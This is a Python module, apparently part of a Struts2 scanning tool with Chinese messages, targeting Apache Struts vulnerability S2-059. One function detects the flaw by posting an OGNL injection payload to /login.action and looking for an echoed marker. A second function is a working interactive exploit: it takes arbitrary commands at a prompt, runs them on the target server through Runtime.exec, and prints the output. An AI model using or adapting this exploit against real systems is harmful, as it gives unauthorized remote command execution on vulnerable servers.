#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from cve.Struts.Struts2scan_main.module.proxy import proxies
from cve.Struts.Struts2scan_main.module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re


def s2_059(url):
    print("[*] 开始检测S2-059")
    vul_nname = "s2_059"
    cmd = "echo 78468794903108696"
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        "Content-type" : "application/x-www-form-urlencoded",
    }
    payload = {
        'username':'111111',
        'password':"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('"+cmd+"')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}",
        
    }
    try:
        vurl = urllib.parse.urljoin(url, '/login.action')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies)
        if "78468794903108696" in req.text and re.search("echo.{0,10}" + "78468794903108696", req.text) == None:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass

def s2_059_exp(url):
    
    first = True
    while 1:
        if first:
            cmd = "echo 78468794903108696"
        else:
            try:
                cmd = input("> ")
                if cmd == '':continue
                if cmd == 'exit':exit()
            except:exit()
        
        
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
            "Content-type" : "application/x-www-form-urlencoded",
        }
        payload = {
            'username':'111111',
            'password':"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('"+cmd+"')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}",
        }

        try:
            vurl = urllib.parse.urljoin(url, '/login.action')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies,allow_redirects=False)
            if "78468794903108696" not in req.text:
                print(color.red("[!]不存在该漏洞"))
                break
            elif first:
                first = False
                print(color.red("[!]特殊符号要url全编码"))
                number1 = req.text.index("78468794903108696")
                afterstring = req.text[number1+len("78468794903108696"):number1+len("78468794903108696")+30]
            else:
                number2 = req.text.index(afterstring) 
                print(urllib.parse.unquote(req.text[number1:number2]))
            
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass